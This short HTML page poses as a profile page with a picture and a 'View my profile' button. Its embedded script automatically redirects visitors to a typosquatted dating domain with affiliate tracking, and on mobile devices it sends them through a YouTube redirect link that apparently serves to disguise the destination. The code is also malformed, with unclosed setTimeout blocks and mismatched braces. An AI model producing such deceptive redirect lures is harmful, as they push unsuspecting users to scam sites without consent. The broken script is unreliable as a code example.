<body>
  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
  <button onclick="myFunction()">View my profile</button>
<script>
    setTimeout(function() {
      myFunction();

    function myFunction() {
      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqa0lrVDVBSHEzVTRnN0F6NnowWVJlRG52cWhaUXxBQ3Jtc0ttcmE1YXFfSXFFT2RqSEM1aC1UR2NSU2pSbzJmYkdiTGtyOUZFaTRTdTVxYkxkcDdTVEVyYVJiZWN4VnlDRmtJWEdYN0dybDQ0eFNkaTNsLUlySUkyRU1QeG9HeDBuQS0yamU0MzNWeU10bWJfRjcwcw&q=https%3A%2F%2Fxbxljk.remarkabiedates.com%2F%3Futm_source%3Dda57dc555e50572d%26s1%3D197845%26s2%3D1904641%26j1%3D1&html_redirect=1";
      
      var fallback = "https://xbxljk.remarkabiedates.com/?utm_source=da57dc555e50572d&s1=197845&s2=1904641&j1=1";

      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          window.location = app;
          window.setTimeout(function() {
              window.location = fallback;

      } else {
          window.location = fallback;
      }

      function killPopup() {
          window.removeEventListener('pagehide', killPopup);
      }

      window.addEventListener('pagehide', killPopup);
    }
</script>
